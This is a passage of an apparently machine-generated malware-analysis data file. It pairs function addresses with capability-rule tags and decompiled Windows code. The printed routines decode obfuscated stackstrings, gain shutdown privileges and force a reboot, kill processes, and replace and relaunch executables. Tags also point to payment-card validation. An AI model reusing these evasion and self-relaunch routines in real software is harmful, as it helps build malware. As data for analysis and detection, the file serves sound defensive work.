        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041106c(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint NewState;\n    uint lpLuid;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint TokenHandle;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_38h = 0x25653434;\n    var_34h = 0x59351331;\n    var_30h = 0x23372a3a;\n    var_2ch = 0xb2d3b5f;\n    var_28h = 0x44285134;\n    var_14h = 0x4d365167;\n    var_10h._0_1_ = 0x44;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    var_4h = 0;\n    *puVar8 = 0;\n    puVar8[1] = 0;\n    puVar8[2] = 0;\n    puVar8[3] = 0;\n    puVar8[4] = 0;\n    *(puVar8 + 5) = 0;\n    var_8h = &var_38h - puVar8;\n    do {\n        iVar9 = var_4h;\n        pcVar1 = var_4h + puVar8;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_14h + iVar9 % 5);\n        uVar3 = pcVar1[var_8h];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_4h = var_4h + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (var_4h < 0x14);\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar7);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, puVar8, &lpLuid);\n    NewState = 1;\n    var_18h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0, 0, 0);\n    pcVar4 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar9 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    if (iVar9 == 0) {\n        (*pcVar4)(4, 0);\n    }\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    return;\n}\n",
        "token_count": 778
    },
    "00411dd1": {
        "rules": [
            "contain obfuscated stackstrings",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.00411dd1(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    int32_t *piVar6;\n    code *pcVar7;\n    char cVar8;\n    char cVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint uVar12;\n    uint uVar13;\n    uchar *puVar14;\n    int32_t iVar15;\n    uint extraout_ECX;\n    int32_t iVar16;\n    int32_t unaff_EBX;\n    uint *puVar17;\n    uchar *puVar18;\n    int32_t *piVar19;\n    uint8_t auStack1868 [4];\n    uint uStack1864;\n    uint uStack1860;\n    uint uStack1856;\n    uint uStack1852;\n    uchar uStack1848;\n    uint uStack1847;\n    uchar uStack1843;\n    int32_t iStack1840;\n    uchar auStack1832 [16];\n    uint auStack1816 [12];\n    uchar auStack1768 [12];\n    uchar auStack1756 [12];\n    ushort uStack1744;\n    uchar auStack1742 [102];\n    uchar auStack1640 [4];\n    uchar auStack1636 [12];\n    uchar auStack1624 [4];\n    uchar auStack1620 [4];\n    uchar auStack1616 [496];\n    uchar auStack1120 [8];\n    int32_t aiStack1112 [2];\n    uchar auStack1104 [8];\n    int32_t iStack1096;\n    uchar auStack1092 [8];\n    uchar auStack1084 [520];\n    uchar auStack564 [8];\n    uchar auStack556 [16];\n    uchar auStack540 [536];\n    \n    iVar10 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    iStack1096 = 0;\n    sub.ntdll.dll_memset(auStack1092, 0, 0x228);\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    uStack1744 = 0;\n    sub.ntdll.dll_memset(auStack1742, 0, 0x7e);\n    iStack1096 = 0x22c;\n    iVar16 = 0x44;\n    puVar18 = auStack1832;\n    for (iVar15 = 0x10; iVar15 != 0; iVar15 = iVar15 + -1) {\n        *puVar18 = 0;\n        puVar18 = puVar18 + 1;\n    }\n    auStack1816[0] = 0x44;\n    puVar17 = auStack1816;\n    for (; iVar16 != 0; iVar16 = iVar16 + -1) {\n        *puVar17 = 0;\n        puVar17 = puVar17 + 1;\n    }\n    if (iVar10 != -1) {\n        piVar19 = &iStack1096;\n        iVar15 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar10);\n        pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n        if (iVar15 != 0) {\ncode_r0x00411e7a:\n            if (iVar11 != iStack1096) goto code_r0x00411e83;\n            puVar18 = auStack1624;\n            for (iVar11 = 0x208; iVar11 != 0; iVar11 = iVar11 + -1) {\n                *puVar18 = 0;\n                puVar18 = puVar18 + 1;\n            }\n            fcn.00402281();\n            uVar12 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(auStack1624);\n            pcVar4 = _sym.imp.SHLWAPI.dll_StrCpyW;\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(auStack1756, uVar12);\n            (*pcVar4)(auStack556, auStack1636);\n            (*_sym.imp.SHLWAPI.dll_StrCatW)(auStack564, 0x415cb4);\ncode_r0x00411eff:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar10);\n            pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n        }\n        do {\n            iVar10 = 0;\n            uVar12 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2);\n            iVar11 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(uVar12, aiStack1112);\n            piVar6 = NULL;\n            while (iVar11 != 0) {\n                if ((iVar10 != aiStack1112[0]) &&\n                   (iVar11 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(auStack1768, auStack1084),  iVar11 == 0)) {\n                    uStack1864 = 0;\n                    iVar11 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x401, 0, aiStack1112[0]);\n                    if (iVar11 != 0) {\n                        iVar15 = (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(iVar11, &uStack1864);\n                        if ((iVar15 != 0) && (unaff_EBX == 0x103)) {\n                            iVar10 = 1;\n                            (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar11, 0);\n                        }\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar11);\n                    }\n                }\n                iVar11 = (*_sym.imp.KERNEL32.dll_Process32NextW)(uVar12, auStack1120);\n                piVar6 = piVar19;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar12);\n            (*pcVar4)(0x32);\n            pcVar7 = _sym.imp.KERNEL32.dll_DeleteFileW;\n        } while (piVar6 != NULL);\n        while ((iVar10 = (*pcVar7)(auStack1624),  pcVar5 = _sym.imp.KERNEL32.dll_CopyFileW,  iVar10 == 0 &&\n               (iVar10 = (*_sym.imp.KERNEL32.dll_MoveFileExW)(auStack1620, auStack540, 1), \n               pcVar5 = _sym.imp.KERNEL32.dll_CopyFileW,  iVar10 == 0))) {\n            (*pcVar4)(500);\n        }\n        while (iVar10 = (*pcVar5)(*0x4279dc, auStack1620, 0),  pcVar7 = _sym.imp.KERNEL32.dll_CreateProcessW, \n              iVar10 == 0) {\n            (*pcVar4)(100);\n        }\n        if (*0x4279d8 == 0) {\n            while (iVar10 = (*pcVar7)(0, auStack1616, 0, 0, 0, 0x9000008, 0, 0, auStack1816, auStack1832),  iVar10 == 0)\n            {\n                (*pcVar4)(5000);\n            }\n        }\n        else {\n            uStack1864 = 0x45624b58;\n            uStack1860 = 0x4b0b6848;\n            uStack1856 = 0x6817452a;\n            uStack1852 = 0x45264b0e;\n            uStack1848 = 6;\n            uStack1847 = 0x4f4b1d68;\n            uStack1843 = 0x45;\n            uVar12 = 0x454f4b78;\n            fcn.0040379b(extraout_ECX);\n            iVar11 = 0;\n            iVar10 = -iStack1840;\n            do {\n                pcVar1 = iStack1840 + iVar11;\n                iVar15 = iVar11;\n                cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = (&stack0xfffff8a8)[iVar11 % 6];\n                uVar3 = pcVar1[auStack1868 + iVar10];\n                cVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                iVar11 = iVar15 + 1;\n                *pcVar1 = cVar9 + ((uVar2 ^ uVar3) - cVar8);\n            } while (iVar11 < 0x16);\n            uVar13 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n            puVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar13);\n            puVar18 = puVar14;\n            for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar18 = 0;\n                puVar18 = puVar18 + 1;\n            }\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(puVar14, 0x415714);\n            pcVar4 = _sym.imp.SHLWAPI.dll_StrCatW;\n            (*_sym.imp.SHLWAPI.dll_StrCatW)(puVar14, auStack1640);\n            (*pcVar4)(puVar14, 0x415cb8);\n            (*pcVar4)(puVar14, uVar12);\n            pcVar4 = _sym.imp.KERNEL32.dll_CreateProcessW;\n            while (iVar10 = (*pcVar4)(0, puVar14, 0, 0, 0, 0x9000008, 0, 0, &uStack1864, &stack0xfffff8a8),  iVar10 == 0\n                  ) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n            }\n            fcn.0040376a();\n        }\n        fcn.0041039d();\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    return;\ncode_r0x00411e83:\n    iVar15 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar10, auStack1104);\n    if (iVar15 == 0) goto code_r0x00411eff;\n    goto code_r0x00411e7a;\n}\n",
        "token_count": 2260
    },
    "004139dd": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004139dd(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uint var_10h;\n    uint pszFirst;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_2ch = 0x6c436165;\n    var_28h = 0x6e04484a;\n    var_24h._0_1_ = 5;\n    stack0xffffffd9 = 0x1d612638;\n    var_1fh = 0x484c6c;\n    var_1bh = 0x2438006e;\n    var_17h._0_2_ = 0x6e61;\n    var_17h._2_1_ = 0x6c;\n    stack0xffffffe8 = 0x6c6e6148;\n    var_10h._0_1_ = 0x38;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n    iVar7 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar6);\n    uVar8 = 0;\n    do {\n        *(iVar7 + uVar8) = *(iVar7 + uVar8) ^ 0x25;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x31);\n    sub.ntdll.dll_memset(iVar7, 0, 0x31);\n    var_4h = 0;\n    var_8h = &var_2ch - iVar7;\n    do {\n        iVar9 = var_4h;\n        pcVar1 = iVar7 + var_4h;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_17h + iVar9 % 5 + 3);\n        uVar3 = pcVar1[var_8h];\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_4h = var_4h + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n    } while (var_4h < 0x18);\n    iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar7);\n    uVar8 = 0;\n    do {\n        *(iVar7 + uVar8) = *(iVar7 + uVar8) + '_';\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x31);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n    return iVar9 != 0;\n}\n",
        "token_count": 729
    },
    "00413acb": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __fastcall fcn.00413acb(uint param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uchar var_1fh;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint pszFirst;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_34h = 0x45624b58;\n    var_30h = 0x4b0b6848;\n    var_2ch = 0x6817452a;\n    var_28h = 0x45264b0e;\n    var_24h._0_1_ = 6;\n    stack0xffffffd9 = 0x4f4b1d68;\n    var_1fh = 0x45;\n    var_14h = 0x454f4b78;\n    var_10h._0_2_ = 0x6865;\n    pszFirst = param_1;\n    fcn.0040379b(param_1);\n    var_8h = &var_34h - var_18h;\n    var_4h = 0;\n    do {\n        iVar6 = var_4h;\n        pcVar1 = var_18h + var_4h;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_14h + iVar6 % 6);\n        uVar3 = pcVar1[var_8h];\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_4h = var_4h + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n    } while (var_4h < 0x16);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, var_18h);\n    fcn.0040376a();\n    return iVar6 != 0;\n}\n",
        "token_count": 529
    },
    "00413b80": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00413b80(void)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint pszFirst;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0x660d4877;\n    var_1ch = 0x793b5a26;\n    var_18h = 0x485a4312;\n    var_14h = 0x6679485a;\n    var_10h._0_1_ = 0x43;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n    uVar9 = 0;\n    do {\n        *(var_8h + uVar9) = *(var_8h + uVar9) ^ 0xfa;\n        uVar9 = uVar9 + 1;\n    } while (uVar9 < 0x19);\n    puVar11 = var_8h;\n    for (iVar10 = 6; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    var_4h = 0;\n    *puVar11 = 0;\n    iVar10 = &var_20h - var_8h;\n    do {\n        iVar5 = var_4h;\n        pcVar1 = var_8h + var_4h;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar3 = *(&var_14h + iVar5 % 5);\n        uVar4 = pcVar1[iVar10];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puVar11 = var_8h;\n        var_4h = var_4h + 1;\n        *pcVar1 = cVar7 + ((uVar3 ^ uVar4) - cVar6);\n    } while (var_4h < 0xc);\n    iVar10 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, var_8h);\n    uVar9 = 0;\n    do {\n        puVar2 = puVar11 + uVar9;\n        *puVar2 = *puVar2 ^ 0x13;\n        uVar9 = uVar9 + 1;\n    } while (uVar9 < 0x19);\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar11);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    return iVar10 != 0;\n}\n",
        "token_count": 720
    },
    "00413c50": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __fastcall fcn.00413c50(uint param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint pszFirst;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_30h = 0x357e4654;\n    var_2ch = 0x5330747b;\n    var_28h = 0x460c5642;\n    var_24h = 0x742c352a;\n    var_20h._0_2_ = 0x5346;\n    var_14h = 0x35534674;\n    var_10h._0_1_ = 0x56;\n    pszFirst = param_1;\n    fcn.00403728(param_1);\n    var_8h = &var_30h - var_18h;\n    var_4h = 0;\n    do {\n        iVar6 = var_4h;\n        pcVar1 = var_18h + var_4h;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_14h + iVar6 % 5);\n        uVar3 = pcVar1[var_8h];\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_4h = var_4h + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n    } while (var_4h < 0x12);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, var_18h);\n    fcn.004036f7();\n    return iVar6 != 0;\n}\n",
        "token_count": 490
    },
    "0040216e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040216e(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    int32_t *piVar5;\n    uchar *puVar6;\n    int32_t iStack60;\n    \n    iStack60 = 0x10;\n    arg_8h_00 = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    piVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    piVar5 = piVar3;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar5 = 0;\n        piVar5 = piVar5 + 1;\n    }\n    piVar3[2] = arg_8h;\n    iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    *piVar3 = iVar4;\n    if (iVar4 != 0) {\n        puVar6 = &stack0xffffffc8;\n        for (iVar4 = 0x18; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar4 = fcn.00402026();\n        if (iVar4 != 0) {\n            iVar4 = fcn.00402026();\n            arg_8h_00 = -(iVar4 != 0) & 0x10;\n        }\n        do {\n            iVar4 = fcn.0040c5e3(arg_8h_00);\n            (*_sym.imp.KERNEL32.dll_Sleep)(100);\n            fcn.0040c5e3(arg_8h_00);\n            if (iVar4 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iStack60 = iStack60 + 1;\n        } while (iStack60 < 0x14);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x8);\n        (*pcVar1)(*0xc);\n    }\n    return 0;\n}\n",
        "token_count": 547
    },
    "004034cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004034cf(int32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    char cVar2;\n    int32_t *in_ECX;\n    \n    cVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    cVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    *(arg_8h + *in_ECX) = cVar2 + (arg_ch - cVar1);\n    return;\n}\n",
        "token_count": 106
    },
    "00403547": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403547(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) + 'I';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar1);\n    return;\n}\n",
        "token_count": 159
    },
    "0040356c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0040356c(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x41;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n    uVar2 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) + 'i';\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 221
    },
    "004035d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.004035d3(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x31;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n    uVar2 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) + -0x4f;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 224
    },
    "00403615": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403615(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) + -0x6b;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 162
    },
    "0040363a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0040363a(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x25;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) * -0x77;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 223
    },
    "004036b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.004036b5(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x25;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) ^ 0xe7;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 223
    },
    "00403728": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.00403728(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x25;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) + -0x7b;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 223
    },
    "0040379b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0040379b(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x2d;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x2d);\n    uVar2 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) + '\\x1d';\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 225
    },
    "004037dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004037dd(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) + '$';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 158
    },
    "00403802": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.00403802(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x2d;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x2d);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) ^ 0xec;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 223
    },
    "00403844": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.00403844(int16_t *param_1, int16_t param_2)\n\n{\n    int16_t *piVar1;\n    \n    piVar1 = NULL;\n    while( true ) {\n        if (*param_1 == param_2) {\n            piVar1 = param_1;\n        }\n        if (*param_1 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    return piVar1;\n}\n",
        "token_count": 108
    },
    "0040388f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "link function at runtime on Windows"
        ],
